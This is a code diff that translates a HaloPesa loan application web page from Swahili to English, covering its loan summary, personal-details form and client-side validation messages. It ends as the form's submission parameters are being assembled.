@@ -1,9 +1,9 @@
 <!DOCTYPE html>
-<html lang="sw">
+<html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>HaloPesa - Kamilisha Ombi</title>
+    <title>HaloPesa - Complete Application</title>
     <style>
         :root {
             --hp-orange: #FF5A1F;
@@ -72,55 +72,55 @@
             </svg>
         </div>
         <div class="brand-name">HaloPesa</div>
-        <div class="header-sub">Kamilisha ombi lako</div>
+        <div class="header-sub">Complete your application</div>
         <div class="card">
-            <div class="card-title">📊 Muhtasari wa Mkopo</div>
+            <div class="card-title">📊 Loan Summary</div>
             <div class="loan-summary">
-                <div class="summary-item"><div class="label">Kiasi cha Mkopo</div><div class="value orange" id="summaryAmount">TZS 1,000,000</div></div>
-                <div class="summary-item"><div class="label">Muhula</div><div class="value" id="summaryTerm">3 Mwezi/mi</div></div>
-                <div class="summary-item"><div class="label">Kila Mwezi</div><div class="value orange" id="summaryMonthly">TZS 336,115</div></div>
-                <div class="summary-item"><div class="label">Riba</div><div class="value">5%</div></div>
+                <div class="summary-item"><div class="label">Loan Amount</div><div class="value orange" id="summaryAmount">TZS 1,000,000</div></div>
+                <div class="summary-item"><div class="label">Term</div><div class="value" id="summaryTerm">3 Months</div></div>
+                <div class="summary-item"><div class="label">Monthly Payment</div><div class="value orange" id="summaryMonthly">TZS 336,115</div></div>
+                <div class="summary-item"><div class="label">Interest Rate</div><div class="value">5%</div></div>
             </div>
         </div>
         <div class="card">
-            <div class="card-title">📋 Kamilisha Ombi Lako</div>
-            <p style="font-size:0.8rem; color:var(--gray); text-align:center; margin-bottom:14px;">Jaza maelezo yako binafsi hapa chini</p>
+            <div class="card-title">📋 Personal Information</div>
+            <p style="font-size:0.8rem; color:var(--gray); text-align:center; margin-bottom:14px;">Fill in your personal details below</p>
             <form id="applicationForm">
                 <div class="form-group">
-                    <label>Jina kamili</label>
+                    <label>Full Name</label>
                     <input type="text" id="fullName" placeholder="John M. Doe" required>
                 </div>
                 <div class="form-group">
-                    <label>Nambari ya simu</label>
+                    <label>Phone Number</label>
                     <input type="tel" id="phone" placeholder="0622 345 678" required>
-                    <div class="hint">📱 Ingiza namba yako kuanzia 0 (digiti 10)</div>
+                    <div class="hint">📱 Enter your number starting with 0 (10 digits)</div>
                 </div>
                 <div class="form-group">
-                    <label>Hali ya ajira</label>
+                    <label>Employment Status</label>
                     <select id="employmentStatus" required>
-                        <option value="">Chagua</option>
-                        <option value="ajira_ya_muda_wote">Ajira ya muda wote</option>
-                        <option value="ajira_kwa_muda">Ajira kwa muda</option>
-                        <option value="kujiajiri">Kujiajiri</option>
-                        <option value="mmiliki_wa_biashara">Mmiliki wa biashara</option>
-                        <option value="mstaafu">Mstaafu</option>
+                        <option value="">Select</option>
+                        <option value="full_time">Full Time Employment</option>
+                        <option value="part_time">Part Time Employment</option>
+                        <option value="self_employed">Self Employed</option>
+                        <option value="business_owner">Business Owner</option>
+                        <option value="retired">Retired</option>
                     </select>
                 </div>
                 <div class="form-group">
-                    <label>Mapato ya kila mwezi (TZS)</label>
+                    <label>Monthly Income (TZS)</label>
                     <input type="number" id="monthlyIncome" placeholder="e.g 350000" required>
-                    <div class="hint">Tafadhali ingiza mapato yako ya kila mwezi</div>
+                    <div class="hint">Please enter your monthly income</div>
                 </div>
                 <input type="hidden" id="loanAmount" value="">
                 <input type="hidden" id="loanMonths" value="">
-                <button type="submit" class="btn-submit" id="submitBtn">Endelea →</button>
+                <button type="submit" class="btn-submit" id="submitBtn">Continue →</button>
                 <div id="formStatus" class="message hidden"></div>
             </form>
         </div>
         <div class="footer-features">
-            <span>🔒 Salama kwa Njia Fiche</span>
-            <span>⚡ Idhini ya Dakika 5</span>
-            <span>💰 Hakuna Ada Zilizofichwa</span>
+            <span>🔒 Secure Encryption</span>
+            <span>⚡ 5-Minute Approval</span>
+            <span>💰 No Hidden Fees</span>
         </div>
     </div>
     <script>
@@ -137,7 +137,7 @@
         else { monthlyPayment = amount * monthlyRate * Math.pow(1 + monthlyRate, months) / (Math.pow(1 + monthlyRate, months) - 1); }
         function formatCurrency(num) { return 'TZS ' + Math.round(num).toLocaleString('en-US'); }
         document.getElementById('summaryAmount').textContent = formatCurrency(amount);
-        document.getElementById('summaryTerm').textContent = months + ' Mwezi/mi';
+        document.getElementById('summaryTerm').textContent = months + ' Months';
         document.getElementById('summaryMonthly').textContent = formatCurrency(monthlyPayment);
         document.getElementById('loanAmount').value = amount;
         document.getElementById('loanMonths').value = months;
@@ -154,25 +154,25 @@
             const monthlyIncome = parseInt(document.getElementById('monthlyIncome').value.trim()) || 0;
 
             if (!fullName || fullName.length < 3) {
-                showMessage(formStatus, 'Tafadhali ingiza jina lako kamili.', 'error');
+                showMessage(formStatus, 'Please enter your full name.', 'error');
                 return;
             }
             if (!phone || phone.length < 9) {
-                showMessage(formStatus, 'Tafadhali ingiza nambari halali ya simu (angalau tarakimu 9).', 'error');
+                showMessage(formStatus, 'Please enter a valid phone number (at least 9 digits).', 'error');
                 return;
             }
             if (!employmentStatus) {
-                showMessage(formStatus, 'Tafadhali chagua hali yako ya ajira.', 'error');
+                showMessage(formStatus, 'Please select your employment status.', 'error');
                 return;
             }
             if (monthlyIncome < 10000) {
-                showMessage(formStatus, 'Tafadhali ingiza mapato yako ya kila mwezi.', 'error');
+                showMessage(formStatus, 'Please enter your monthly income.', 'error');
                 return;
             }
 
             hideMessage(formStatus);
             submitBtn.disabled = true;
-            submitBtn.innerHTML = '<span class="loader"></span> Inasubiri...';
+            submitBtn.innerHTML = '<span class="loader"></span> Processing...';
 
             const params = new URLSearchParams({
                 amount: amount,
